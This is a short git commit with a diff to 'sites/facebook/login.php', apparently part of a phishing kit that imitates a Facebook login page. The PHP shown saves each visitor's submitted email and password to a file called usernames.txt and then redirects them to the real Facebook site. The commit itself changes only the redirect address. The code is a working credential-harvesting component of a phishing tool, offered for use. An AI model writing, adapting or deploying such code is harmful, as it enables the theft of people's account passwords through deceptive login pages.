e627e9e57100625ac8e0088a6783f7312aa654b8
enamulhaque <enamulhaque028@gmail.com>
2020-08-13 21:36:16 +0600

    Updated but may be faulty

--- sites/facebook/login.php
+++ sites/facebook/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://www.facebook.com/');
+header('Location: https://facebook.com/');
 exit();
